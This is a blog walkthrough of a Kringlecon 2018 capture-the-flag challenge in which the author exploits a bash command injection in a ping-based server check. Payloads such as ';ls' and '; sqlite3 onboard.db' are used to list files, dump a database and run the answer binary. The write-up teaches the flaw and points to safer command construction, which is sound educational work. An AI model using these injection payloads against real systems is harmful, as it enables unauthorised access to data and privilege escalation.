---
layout: post
title:  "Kringlecon: Command injection with bash"
date:   2019-01-13 12:29:29 -0500
categories: 
---

*Warning: this post is a walkthrough and contains spoilers.*

Kringlecon 2018 included a basic `bash` command injection challenge. One of the elves needs assistance with finding a particular employee's 
first name from a SQLite database. You would then run `runtoanswer`, supply that first name, and challenge complete. The elf
gives you a hint about how to run Windows Powershell commands, a possible hint that the system might be vulnerable to injecting a Powershell
command into it.

# Walkthrough

Like the Python escape challenge, this terminal challenge did not log you in directly to `bash`. Instead you're placed into a new employee
registration system that allows you to either enter your contact information as a new employee, or run a system check to make
sure things are running normally. For this walkthrough we'll ignore the registration page and attack the sanity check. It prompts us
for a server name; let's try `localhost` to see what happens.

```
Validating data store for employee onboard information.
Enter address of server: localhost
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.121 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.046 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.043 ms
--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2026ms
rtt min/avg/max/mdev = 0.043/0.070/0.121/0.036 ms
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

That looks like the output of Linux's ping command, not Windows. We also see that the name of the database is `onboard.db`, which will be handy later.
The fact that we're seeing direct output of a shell command is interesting; it seems that whoever wrote this sanity check may be directly passing
our input to a command and giving us the output directly. When we put in `localhost`, for instance, we might imagine that a command like this was built:

```bash
/bin/bash -c "ping -c 4 'localhost'"
```

Let's test the theory. What if I pass in an invalid name that would break the syntax of the final command like a single `'`?

```
Validating data store for employee onboard information.
Enter address of server: '
/bin/bash: -c: line 0: unexpected EOF while looking for matching `''
/bin/bash: -c: line 1: syntax error: unexpected end of file
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

That confirms that the sanity check is using bash, and not Powershell as the hint might have initially lead us to believe. What if we put in something
a little more interesting?

```
Validating data store for employee onboard information.
Enter address of server: ;ls
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
menu.ps1  onboard.db  runtoanswer
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

We use `;` to terminate the `ping` command, and then run `ls` to get a directory listing. Sure enough, we see `onboard.db` is in the current directory.
`menu.ps1` contains the Powershell code that runs the challenge's menu system; it seems whoever wrote this system either installed Powershell on Linux
or they're running the Windows Subsystem for Linux. We can run `; cat menu.ps1` to get the source code for the system if we please, which would make it
easier to attack the registration part of the code. But there's no need for that now; we're already injecting bash commands!

We can get access to the database by injecting `; sqlite3 onboard.db`. We're now in a `sqlite3` interactive prompt. Running `.dump` outputs the schema
and all of the data to the console to find the data we need. I'm not going to print it all here; after finding the name we were asked to, however,
we can inject `; ./runtoanswer` to get a prompt that asks for the first name. Giving the correct guess clears the challenge.

# Conclusion

If you absolutely *must* run shell commands based on user input for some reason, [http://mywiki.wooledge.org/BashFAQ/050](this guide) 
includes some better ways to build your commands so that they can't be broken so easily in bash. Solving the Powershell side of the challenge
(both on attack and defense) is left as an exercise for the reader. This was a fun exercise; I'm hoping there aren't too many systems in the wild
that are building shell commands off of arbitrary user input, but just typing that out is enough to make one realize it must be happening all over
the place. It's also not difficult to imagine a suid script that allows junior admins to perform functions that their normal user accounts
wouldn't have access to instead of setting permissions appropriately; a malicious insider could use this technique to escalate privileges.